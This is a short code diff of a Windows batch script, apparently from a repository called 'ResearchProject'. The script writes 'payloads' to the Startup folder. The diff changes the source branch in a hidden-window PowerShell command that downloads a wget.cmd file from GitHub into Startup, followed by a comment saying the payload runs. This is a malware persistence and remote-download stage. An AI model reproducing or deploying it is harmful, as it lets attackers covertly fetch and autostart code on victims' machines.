@@ -12,7 +12,7 @@ cd %STARTUP%
 @REM Write payloads to startup
 
 
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/Monitoring/Original/Resources/wget.cmd' -OutFile wget.cmd"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/wget.cmd' -OutFile wget.cmd"
 
 
 @REM run payload
